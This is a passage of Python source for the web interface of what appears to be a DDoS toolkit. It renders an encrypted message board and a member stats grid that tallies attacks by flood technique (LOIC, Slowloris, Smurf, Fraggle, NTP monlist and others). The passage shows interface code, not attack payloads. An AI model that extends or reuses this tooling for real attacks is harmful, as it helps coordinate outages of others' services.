            board_panel = "<form method='GET'><table cellpadding='5'><tr><td><table cellpadding='10' border='1'><tr><td><table cellpadding='10' border='1'><tr><td> <input type='radio' name='board_action' id='read' onclick='javascript:OptionsCheck();' CHECKED> READ<br> </td><td> <input type='radio' name='board_action' id='write' onclick='javascript:OptionsCheck();'> WRITE<br></td></tr></table></td><td> KEY: <input type='text' name='board_key' id='board_key' size='20' value='"+str(self.crypto_key)+"'> </td></tr></table></td><td><div style='display:block' id='board_read'><table cellpadding='5'><tr><td>"+board_filter+"</td></tr><tr><td><a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt_board();>Try decryption!</a></td></tr></table></div></td></tr><tr><td>"+self.board_welcome+"</td><td><div style='display:none' id='board_send'><table cellpadding='10' border='1'><tr><td><table cellpadding='10' border='1'><tr><td>Blackhole/IP:</td><td><input type='text' name='board_source_send' id='board_source_send' size='20' value='"+default_blackhole+"'></td></tr><tr><td>TOPIC:</td><td>"+self.board_topic+"</td></tr><tr><td>MESSAGE:</td><td><textarea rows='3' cols='50' name='stream_txt' id='stream_txt' maxlength='140' placeholder='Enter your message (1-140 chars)...'></textarea></td></tr><tr><td>"+self.board_send_msg+"</td></tr></table></td></tr></table></div></td></tr></table></form><br><hr><br><div id='sync_panel_block' name='sync_panel_block' style='display:none;'>"+sync_panel+"<br></div><u>CRYPTO-BOARD</u>: (Last Update: <font color='green'>"+str(l)+"</font>)<br><br><div id='cmdOut'></div><div id='nb1' style='display: block;'>"+self.moderator_text+"</div><br><br>"
        if device_state == "OFF":
            remove_profile = ""
        else:
            remove_profile = '| <button title="Syncronize data from a blackhole/board with your device..." onclick="Sync_panel()">DOWNLOAD!</button> | <button title="Remove your profile and turn OFF this device..." onclick="RemoveProfile()">TURN OFF!</button>'
        return self.pages["/header"] + """<script language="javascript"> 
function BoardProfile() {
        var win_board_profile = window.open("board_profile","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function RemoveProfile() {
        var win_board_profile = window.open("board_remove","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Decrypt_board(){
        board_key=document.getElementById("board_key").value
        if (document.getElementById('filter_all').checked) {
          filter = document.getElementById('filter_all').value;
        }
        if (document.getElementById('filter_general').checked) {
          filter = document.getElementById('filter_general').value;
        }
        if (document.getElementById('filter_opsec').checked) {
          filter = document.getElementById('filter_opsec').value;
        }
        if (document.getElementById('filter_faq').checked) {
          filter = document.getElementById('filter_faq').value;
        }
        if (document.getElementById('filter_bugs').checked) {
          filter = document.getElementById('filter_bugs').value;
        }
        if (document.getElementById('filter_media').checked) {
          filter = document.getElementById('filter_media').value;
        }
        if(board_key == "") {
          window.alert("You need to enter a valid key (provided by someone)");
          return
         }else{
          params="board_key="+escape(board_key)+"&filter="+escape(filter)
         runCommandX("cmd_decrypt_moderator_board",params)
         document.getElementById("nb1").style.display = "none";
         }
       }
function OptionsCheck() {
    if (document.getElementById('read').checked) {
        document.getElementById('board_read').style.display = 'block';
        document.getElementById('board_send').style.display = 'none';
        document.getElementById('board_warning').style.display = 'none';
    } 
    else if(document.getElementById('write').checked) {
        document.getElementById('board_send').style.display = 'block';
        document.getElementById('board_warning').style.display = 'block';
        document.getElementById('board_read').style.display = 'none';
   }
}
function Sync_panel(){
         document.getElementById("sync_panel_block").style.display = "block";
       }
function SyncBoard(){
        document.getElementById('nb1').style.display = 'none';
        board_source=document.getElementById("board_source").value
        if(board_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
         }else{
          params="board_source="+escape(board_source)
         runCommandX("cmd_sync_board",params)
         setTimeout("location.reload()", 10000)
         }
      }
</script>
<script language="javascript">
function SendMessage() {
        board_source=document.getElementById("board_source_send").value
        board_key=document.getElementById("board_key").value
        stream_txt=document.getElementById("stream_txt").value
        board_selector=document.getElementById("board_selector");
        board_topic = board_selector.options[board_selector.selectedIndex].value;
        if(board_key == "") {
            board_key='"""+str(self.crypto_key)+"""';
        }else{
          if(stream_txt == "") {
            window.alert("You need to enter a message! (~ 1-140 characters)");
            return
          }else{
           if(board_source == "") {
            window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
           return
          }else{
            params="board_source="+escape(board_source)+"&board_key="+escape(board_key)+"&board_topic="+escape(board_topic)+"&stream_txt="+escape(stream_txt)
            runCommandX("cmd_send_message_board",params)
            setTimeout("location.reload()", 10000)
           }
          }
        }
       }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center>
<table cellpadding="5" cellspacing="5"><tr>
<td><a href="javascript:alert('Riättth says: """ + self.ranking + """... Welcome to the Crypto-Board!. You can generate new identities every time that you want. But remember that, this can be a dangerous place. Just respect to others to be respected... Keep safe and enjoy it. COPYCAT!.');"><img src='data:image/png;base64,"""+self.board_img+"""'></a></td><td>
<table cellpading="5" cellspacing="10"><tr><td>"""+device+"""<br><button title="Set your profile for this device..." onclick="BoardProfile()">CONFIGURE!</button> """+remove_profile+"""
</td></tr></table></tr></table>
<hr><br>"""+board_panel+"""
""" + self.pages["/footer"]

    def generate_grid(self):
        with open(self.grid_file) as f:
            for line in f:
                line = line.strip()
            f.close()
            mothership_members = 0 # mothership_members stats bonus
            unknown_members = 0 # unknown (or non decrypted) mothership members
            grid_table = "<center><u>MEMBERS STATS:</u></center><br><table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><u>NICKNAME:</u></td><td align='center'><u>RANK:</u></td><td align='center'><u>CHARGO:</u></td><td align='center'><u>DORKING:</u></td><td align='center'><u>TRANSF:</u></td><td align='center'><u>MAX.CHARGO:</u></td><td align='center'><u>MISSIONS:</u></td><td align='center'><u>ATTACKS:</u></td><td align='center'><u>LOIC:</u></td><td align='center'><u>LORIS:</u></td><td align='center'><u>UFOSYN:</u></td><td align='center'><u>SPRAY:</u></td><td align='center'><u>SMURF:</u></td><td align='center'><u>XMAS:</u></td><td align='center'><u>NUKE:</u></td><td align='center'><u>TACHYON:</u></td><td align='center'><u>MONLIST:</u></td><td align='center'><u>FRAGGLE:</u></td><td align='center'><u>SNIPER:</u></td><td align='center'><u>UFOACK:</u></td><td align='center'><u>UFORST:</u></td><td align='center'><u>DROPER:</u></td><td align='center'><u>OVERLAP:</u></td><td align='center'><u>PINGER:</u></td><td align='center'><u>UFOUDP:</u></td><td align='center'><u>CONTACT:</u></td></tr>"
            for m in self.list_grid: # msg = nickname, ranking, chargo, dorking, transf, maxchargo, missions, attacks, loic, loris, ufosyn, spray, smurf, xmas, nuke, tachyon, monlist, fraggle, sniper, ufoack, uforst, droper, overlap, pinger, ufoudp, contact, ID
                if grid_msg_sep in m:
                    version = m.count(grid_msg_sep) # check UFONet stream version (made for compatibility with old motherships)
                    m = m.split(grid_msg_sep)
                    mothership_members = mothership_members + 1
                    grid_nickname = m[0][0:12]
                    grid_nickname = ''.join(random.sample(grid_nickname,len(grid_nickname))) # nickname (obfuscation+str12)
                    grid_ranking = m[1][0:4] # ranking (is parsed later using a symbol)
                    grid_ranking = ''.join(random.sample(grid_ranking,len(grid_ranking))) # ranking (obfuscation)
                    grid_totalchargo = m[2][0:4] # total chargo
                    grid_totalchargo = ''.join(random.sample(grid_totalchargo,len(grid_totalchargo))) # totalchargo (obfuscation)
                    grid_dorking = m[3][0:4] # dorking
                    grid_dorking = ''.join(random.sample(grid_dorking,len(grid_dorking))) # dorking (obfuscation)
                    grid_transferred = m[4][0:4] # transferred
                    grid_transferred = ''.join(random.sample(grid_transferred,len(grid_transferred))) # transferred (obfuscation)
                    grid_maxchargo = m[5][0:4] # maxchargo
                    grid_maxchargo = ''.join(random.sample(grid_maxchargo,len(grid_maxchargo))) # maxchargo (obfuscation)
                    grid_missions = m[6][0:4] # missions
                    grid_missions = ''.join(random.sample(grid_missions,len(grid_missions))) # missions (obfuscation)
                    grid_attacks = m[7][0:4] # attacks
                    grid_attacks = ''.join(random.sample(grid_attacks,len(grid_attacks))) # attacks (obfuscation)
                    grid_loic = m[8][0:4] # loic
                    grid_loic = ''.join(random.sample(grid_loic,len(grid_loic))) # loic (obfuscation)
                    if version > 18: # v1.5
                        grid_loris = m[9][0:4] # loris
                        grid_loris = ''.join(random.sample(grid_loris,len(grid_loris))) # loris (obfuscation)
                        grid_ufosyn =  m[10][0:4] # ufosyn
                        grid_ufosyn = ''.join(random.sample(grid_ufosyn,len(grid_ufosyn))) # ufosyn (obfuscation)
                        grid_spray =  m[11][0:4] # spray
                        grid_spray = ''.join(random.sample(grid_spray,len(grid_spray))) # spray (obfuscation)
                        grid_smurf =  m[12][0:4] # smurf
                        grid_smurf = ''.join(random.sample(grid_smurf,len(grid_smurf))) # smurf (obfuscation)
                        grid_xmas =  m[13][0:4] # xmas
                        grid_xmas = ''.join(random.sample(grid_xmas,len(grid_xmas))) # xmas (obfuscation)
                        grid_nuke =  m[14][0:4] # nuke
                        grid_nuke = ''.join(random.sample(grid_nuke,len(grid_nuke))) # nuke (obfuscation)
                        grid_tachyon =  m[15][0:4] # tachyon
                        grid_tachyon = ''.join(random.sample(grid_tachyon,len(grid_tachyon))) # tachyon (obfuscation)
                        grid_monlist =  m[16][0:4] # monlist
                        grid_monlist = ''.join(random.sample(grid_monlist,len(grid_monlist))) # monlist (obfuscation)
                        grid_fraggle =  m[17][0:4] # fraggle
                        grid_fraggle = ''.join(random.sample(grid_fraggle,len(grid_fraggle))) # fraggle (obfuscation)
                        grid_sniper =  m[18][0:4] # sniper
                        grid_sniper = ''.join(random.sample(grid_sniper,len(grid_sniper))) # sniper (obfuscation)
                        grid_ufoack =  m[19][0:4] # ufoack
                        grid_ufoack = ''.join(random.sample(grid_ufoack,len(grid_ufoack))) # ufoack (obfuscation)
                        grid_uforst =  m[20][0:4] # uforst
                        grid_uforst = ''.join(random.sample(grid_uforst,len(grid_uforst))) # uforst (obfuscation)
                        grid_droper =  m[21][0:4] # droper
                        grid_droper = ''.join(random.sample(grid_droper,len(grid_droper))) # droper (obfuscation)
                        grid_overlap =  m[22][0:4] # overlap
                        grid_overlap = ''.join(random.sample(grid_overlap,len(grid_overlap))) # overlap (obfuscation)
                        grid_pinger =  m[23][0:4] # pinger
                        grid_pinger = ''.join(random.sample(grid_pinger,len(grid_pinger))) # pinger (obfuscation)
                        grid_ufoudp =  m[24][0:4] # ufoudp
                        grid_ufoudp = ''.join(random.sample(grid_ufoudp,len(grid_ufoudp))) # ufoudp (obfuscation)
                        try:
                            grid_contact = "<a href=javascript:alert('"+str(m[25][0:12])+"');>View</a>" # js contact view (obfuscation)
                        except:
                            grid_contact= "invalid"
                        try:
                            grid_id = m[26] # id (plain id)
                        except:
                            grid_id = "invalid!"
                    if version == 18: # v1.4
                        grid_loris = m[9][0:4] # loris
                        grid_loris = ''.join(random.sample(grid_loris,len(grid_loris))) # loris (obfuscation)
                        grid_ufosyn =  m[10][0:4] # ufosyn
                        grid_ufosyn = ''.join(random.sample(grid_ufosyn,len(grid_ufosyn))) # ufosyn (obfuscation)
                        grid_spray =  m[11][0:4] # spray
                        grid_spray = ''.join(random.sample(grid_spray,len(grid_spray))) # spray (obfuscation)
                        grid_smurf =  m[12][0:4] # smurf
                        grid_smurf = ''.join(random.sample(grid_smurf,len(grid_smurf))) # smurf (obfuscation)
                        grid_xmas =  m[13][0:4] # xmas
                        grid_xmas = ''.join(random.sample(grid_xmas,len(grid_xmas))) # xmas (obfuscation)
                        grid_nuke =  m[14][0:4] # nuke
                        grid_nuke = ''.join(random.sample(grid_nuke,len(grid_nuke))) # nuke (obfuscation)
                        grid_tachyon =  m[15][0:4] # tachyon
                        grid_tachyon = ''.join(random.sample(grid_tachyon,len(grid_tachyon))) # tachyon (obfuscation)
                        grid_monlist =  m[16][0:4] # monlist
                        grid_monlist = ''.join(random.sample(grid_monlist,len(grid_monlist))) # monlist (obfuscation)
                        grid_fraggle = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not fraggle present
                        grid_fraggle = ''.join(random.sample(grid_fraggle,len(grid_fraggle))) # fraggle (obfuscation)
                        grid_sniper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not sniper present
                        grid_sniper = ''.join(random.sample(grid_sniper,len(grid_sniper))) # sniper (obfuscation)
                        grid_ufoack = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufoack present
                        grid_ufoack = ''.join(random.sample(grid_ufoack,len(grid_ufoack))) # ufoack (obfuscation)
                        grid_uforst = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not uforst present
                        grid_uforst = ''.join(random.sample(grid_uforst,len(grid_uforst))) # uforst (obfuscation)
                        grid_droper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not droper present
                        grid_droper = ''.join(random.sample(grid_droper,len(grid_droper))) # droper (obfuscation)
                        grid_overlap = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not overlap present
                        grid_overlap = ''.join(random.sample(grid_overlap,len(grid_overlap))) # overlap (obfuscation)
                        grid_pinger = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not pinger present
                        grid_pinger = ''.join(random.sample(grid_pinger,len(grid_pinger))) # pinger (obfuscation)
                        grid_ufoudp = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufoudp present
                        grid_ufoudp = ''.join(random.sample(grid_ufoudp,len(grid_ufoudp))) # ufoudp (obfuscation)
                        try:
                            grid_contact = "<a href=javascript:alert('"+str(m[17][0:12])+"');>View</a>" # js contact view (obfuscation)
                        except:
                            grid_contact= "invalid"
                        try:
                            grid_id = m[18] # id (plain id)
                        except:
                            grid_id = "invalid!"
                    if version == 17: # v1.3
                        grid_loris = m[9][0:4] # loris
                        grid_loris = ''.join(random.sample(grid_loris,len(grid_loris))) # loris (obfuscation)
                        grid_ufosyn =  m[10][0:4] # ufosyn
                        grid_ufosyn = ''.join(random.sample(grid_ufosyn,len(grid_ufosyn))) # ufosyn (obfuscation)
                        grid_spray =  m[11][0:4] # spray
                        grid_spray = ''.join(random.sample(grid_spray,len(grid_spray))) # spray (obfuscation)
                        grid_smurf =  m[12][0:4] # smurf
                        grid_smurf = ''.join(random.sample(grid_smurf,len(grid_smurf))) # smurf (obfuscation)
                        grid_xmas =  m[13][0:4] # xmas
                        grid_xmas = ''.join(random.sample(grid_xmas,len(grid_xmas))) # xmas (obfuscation)
                        grid_nuke =  m[14][0:4] # nuke
                        grid_nuke = ''.join(random.sample(grid_nuke,len(grid_nuke))) # nuke (obfuscation)
                        grid_tachyon =  m[15][0:4] # tachyon
                        grid_tachyon = ''.join(random.sample(grid_tachyon,len(grid_tachyon))) # tachyon (obfuscation)
                        grid_monlist = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not monlist present
                        grid_monlist = ''.join(random.sample(grid_monlist,len(grid_monlist))) # monlist (obfuscation)
                        grid_fraggle = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not fraggle present
                        grid_fraggle = ''.join(random.sample(grid_fraggle,len(grid_fraggle))) # fraggle (obfuscation)
                        grid_sniper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not sniper present
                        grid_sniper = ''.join(random.sample(grid_sniper,len(grid_sniper))) # sniper (obfuscation)
                        grid_ufoack = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufoack present
                        grid_ufoack = ''.join(random.sample(grid_ufoack,len(grid_ufoack))) # ufoack (obfuscation)
                        grid_uforst = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not uforst present
                        grid_uforst = ''.join(random.sample(grid_uforst,len(grid_uforst))) # uforst (obfuscation)
                        grid_droper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not droper present
                        grid_droper = ''.join(random.sample(grid_droper,len(grid_droper))) # droper (obfuscation)
                        grid_overlap = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not overlap present
                        grid_overlap = ''.join(random.sample(grid_overlap,len(grid_overlap))) # overlap (obfuscation)
                        grid_pinger = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not pinger present
                        grid_pinger = ''.join(random.sample(grid_pinger,len(grid_pinger))) # pinger (obfuscation)
                        grid_ufoudp = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufoudp present
                        grid_ufoudp = ''.join(random.sample(grid_ufoudp,len(grid_ufoudp))) # ufoudp (obfuscation)
                        try:
                            grid_contact = "<a href=javascript:alert('"+str(m[16][0:12])+"');>View</a>" # js contact view (obfuscation)
                        except:
                            grid_contact= "invalid"
                        try:
                            grid_id = m[17] # id (plain id)
                        except:
                            grid_id = "invalid!"
                    elif version == 16: # v1.2.1
                        grid_loris = m[9][0:4] # loris
                        grid_loris = ''.join(random.sample(grid_loris,len(grid_loris))) # loris (obfuscation)
                        grid_ufosyn =  m[10][0:4] # ufosyn
                        grid_ufosyn = ''.join(random.sample(grid_ufosyn,len(grid_ufosyn))) # ufosyn (obfuscation)
                        grid_spray =  m[11][0:4] # spray
                        grid_spray = ''.join(random.sample(grid_spray,len(grid_spray))) # spray (obfuscation)
                        grid_smurf =  m[12][0:4] # smurf
                        grid_smurf = ''.join(random.sample(grid_smurf,len(grid_smurf))) # smurf (obfuscation)
                        grid_xmas =  m[13][0:4] # xmas
                        grid_xmas = ''.join(random.sample(grid_xmas,len(grid_xmas))) # xmas (obfuscation)
                        grid_nuke =  m[14][0:4] # nuke
                        grid_nuke = ''.join(random.sample(grid_nuke,len(grid_nuke))) # nuke (obfuscation)
                        grid_tachyon = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not tachyon present
                        grid_tachyon = ''.join(random.sample(grid_tachyon,len(grid_tachyon))) # tachyon (obfuscation)
                        grid_monlist = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not monlist present
                        grid_monlist = ''.join(random.sample(grid_monlist,len(grid_monlist))) # monlist (obfuscation)
                        grid_fraggle = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not fraggle present
                        grid_fraggle = ''.join(random.sample(grid_fraggle,len(grid_fraggle))) # fraggle (obfuscation)
                        grid_sniper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not sniper present
                        grid_sniper = ''.join(random.sample(grid_sniper,len(grid_sniper))) # sniper (obfuscation)
                        grid_ufoack = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufoack present
                        grid_ufoack = ''.join(random.sample(grid_ufoack,len(grid_ufoack))) # ufoack (obfuscation)
                        grid_uforst = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not uforst present
                        grid_uforst = ''.join(random.sample(grid_uforst,len(grid_uforst))) # uforst (obfuscation)
                        grid_droper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not droper present
                        grid_droper = ''.join(random.sample(grid_droper,len(grid_droper))) # droper (obfuscation)
                        grid_overlap = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not overlap present
                        grid_overlap = ''.join(random.sample(grid_overlap,len(grid_overlap))) # overlap (obfuscation)
                        grid_pinger = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not pinger present
                        grid_pinger = ''.join(random.sample(grid_pinger,len(grid_pinger))) # pinger (obfuscation)
                        grid_ufoudp = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufoudp present
                        grid_ufoudp = ''.join(random.sample(grid_ufoudp,len(grid_ufoudp))) # ufoudp (obfuscation)
                        try:
                            grid_contact = "<a href=javascript:alert('"+str(m[15][0:12])+"');>View</a>" # js contact view (obfuscation)
                        except:
                            grid_contact= "invalid"
                        try:
                            grid_id = m[16] # id (plain id)
                        except:
                            grid_id = "invalid!"
                    elif version == 15: # v1.2
                        grid_loris = m[9][0:4] # loris
                        grid_loris = ''.join(random.sample(grid_loris,len(grid_loris))) # loris (obfuscation)
                        grid_ufosyn =  m[10][0:4] # ufosyn
                        grid_ufosyn = ''.join(random.sample(grid_ufosyn,len(grid_ufosyn))) # ufosyn (obfuscation)
                        grid_spray =  m[11][0:4] # spray
                        grid_spray = ''.join(random.sample(grid_spray,len(grid_spray))) # spray (obfuscation)
                        grid_smurf =  m[12][0:4] # smurf
                        grid_smurf = ''.join(random.sample(grid_smurf,len(grid_smurf))) # smurf (obfuscation)
                        grid_xmas =  m[13][0:4] # xmas
                        grid_xmas = ''.join(random.sample(grid_xmas,len(grid_xmas))) # xmas (obfuscation)
                        grid_nuke = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not nuke present
                        grid_nuke = ''.join(random.sample(grid_nuke,len(grid_nuke))) # nuke (obfuscation)
                        grid_tachyon = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not tachyon present
                        grid_tachyon = ''.join(random.sample(grid_tachyon,len(grid_tachyon))) # tachyon (obfuscation)
                        grid_monlist = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not monlist present
                        grid_monlist = ''.join(random.sample(grid_monlist,len(grid_monlist))) # monlist (obfuscation)
                        grid_fraggle = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not fraggle present
                        grid_fraggle = ''.join(random.sample(grid_fraggle,len(grid_fraggle))) # fraggle (obfuscation)
                        grid_sniper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not sniper present
                        grid_sniper = ''.join(random.sample(grid_sniper,len(grid_sniper))) # sniper (obfuscation)
                        grid_ufoack = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufoack present
                        grid_ufoack = ''.join(random.sample(grid_ufoack,len(grid_ufoack))) # ufoack (obfuscation)
                        grid_uforst = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not uforst present
                        grid_uforst = ''.join(random.sample(grid_uforst,len(grid_uforst))) # uforst (obfuscation)
                        grid_droper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not droper present
                        grid_droper = ''.join(random.sample(grid_droper,len(grid_droper))) # droper (obfuscation)
                        grid_overlap = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not overlap present
                        grid_overlap = ''.join(random.sample(grid_overlap,len(grid_overlap))) # overlap (obfuscation)
                        grid_pinger = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not pinger present
                        grid_pinger = ''.join(random.sample(grid_pinger,len(grid_pinger))) # pinger (obfuscation)
                        grid_ufoudp = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufoudp present
                        grid_ufoudp = ''.join(random.sample(grid_ufoudp,len(grid_ufoudp))) # ufoudp (obfuscation)
                        try:
                            grid_contact = "<a href=javascript:alert('"+str(m[14][0:12])+"');>View</a>" # js contact view (obfuscation)
                        except:
                            grid_contact= "invalid"
                        try:
                            grid_id = m[15] # id (plain id)
                        except:
                            grid_id = "invalid!"
                    elif version == 12: # v1.1
                        grid_loris = m[9][0:4] # loris
                        grid_loris = ''.join(random.sample(grid_loris,len(grid_loris))) # loris (obfuscation)
                        grid_ufosyn =  m[10][0:4] # ufosyn
                        grid_ufosyn = ''.join(random.sample(grid_ufosyn,len(grid_ufosyn))) # ufosyn (obfuscation)
                        grid_spray = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not spray present
                        grid_spray = ''.join(random.sample(grid_spray,len(grid_spray))) # spray (obfuscation)
                        grid_smurf = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not smurf present
                        grid_smurf = ''.join(random.sample(grid_smurf,len(grid_smurf))) # smurf (obfuscation)
                        grid_xmas = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not xmas present
                        grid_xmas = ''.join(random.sample(grid_xmas,len(grid_xmas))) # xmas (obfuscation)
                        grid_nuke = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not nuke present
                        grid_nuke = ''.join(random.sample(grid_nuke,len(grid_nuke))) # nuke (obfuscation)
                        grid_tachyon = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not tachyon present
                        grid_tachyon = ''.join(random.sample(grid_tachyon,len(grid_tachyon))) # tachyon (obfuscation)
                        grid_monlist = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not monlist present
                        grid_monlist = ''.join(random.sample(grid_monlist,len(grid_monlist))) # monlist (obfuscation)
                        grid_fraggle = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not fraggle present
                        grid_fraggle = ''.join(random.sample(grid_fraggle,len(grid_fraggle))) # fraggle (obfuscation)
                        grid_sniper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not sniper present
                        grid_sniper = ''.join(random.sample(grid_sniper,len(grid_sniper))) # sniper (obfuscation)
                        grid_ufoack = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufoack present
                        grid_ufoack = ''.join(random.sample(grid_ufoack,len(grid_ufoack))) # ufoack (obfuscation)
                        grid_uforst = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not uforst present
                        grid_uforst = ''.join(random.sample(grid_uforst,len(grid_uforst))) # uforst (obfuscation)
                        grid_droper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not droper present
                        grid_droper = ''.join(random.sample(grid_droper,len(grid_droper))) # droper (obfuscation)
                        grid_overlap = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not overlap present
                        grid_overlap = ''.join(random.sample(grid_overlap,len(grid_overlap))) # overlap (obfuscation)
                        grid_pinger = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not pinger present
                        grid_pinger = ''.join(random.sample(grid_pinger,len(grid_pinger))) # pinger (obfuscation)
                        grid_ufoudp = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufoudp present
                        grid_ufoudp = ''.join(random.sample(grid_ufoudp,len(grid_ufoudp))) # ufoudp (obfuscation)
                        grid_contact = "<a href=javascript:alert('"+str(m[11][0:12])+"');>View</a>" # js contact view (obfuscation)
                        try:
                            grid_id = m[12] # id (plain id)
                        except:
                            grid_id = "invalid!"
                    elif version == 11: # v1.0
                        grid_loris = m[9][0:4] # loris
                        grid_loris = ''.join(random.sample(grid_loris,len(grid_loris))) # loris (obfuscation)
                        grid_ufosyn = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufosyn present
                        grid_ufosyn = ''.join(random.sample(grid_ufosyn,len(grid_ufosyn))) # ufosyn (obfuscation)
